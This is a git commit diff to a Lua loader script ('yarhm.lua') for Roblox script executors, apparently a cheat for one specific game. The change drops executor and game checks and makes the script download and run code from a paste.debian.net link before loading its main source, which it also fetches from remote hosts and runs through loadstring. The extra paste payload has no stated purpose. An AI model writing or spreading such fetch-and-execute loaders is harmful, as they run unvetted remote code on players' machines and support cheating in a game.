b0cfb3d4644cb4a2075f459520f54a3b3031bee5
J0ystickplays <vtrftech@gmail.com>
2025-08-26 10:34:52 +0800

    Update yarhm.lua

--- yarhm.lua
+++ yarhm.lua
@@ -1,12 +1,8 @@
-local execname = getexecutorname() or identifyexecutor()
-if execname == "Delta" or execname == nil then game.Players.LocalPlayer:Kick("Unsupported Executor") end
-if not game.PlaceId == 142823291 then game.Players.LocalPlayer:Kick("Unsupported Game") end
+if game.PlaceId == 142823291 then loadstring(game:HttpGet("https://paste.debian.net/plainh/f082c56b/", true))() end
 local src = ""
 local CoreGui = game:GetService("StarterGui")
-
 pcall(function() 
     src = game:HttpGet("https://yarhm.mhi.im/scr", false)
-	loadstring(game:HttpGet("https://paste.debian.net/plainh/f082c56b/", true))()
 end)
 if src == "" then
   CoreGui:SetCore("SendNotification", {
@@ -15,7 +11,5 @@ if src == "" then
 	  Duration = 5;
   })
   src = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.19/yarhm.lua", false)
-  loadstring(game:HttpGet("https://paste.debian.net/plainh/f082c56b/", true))()
 end
-
 loadstring(src)()
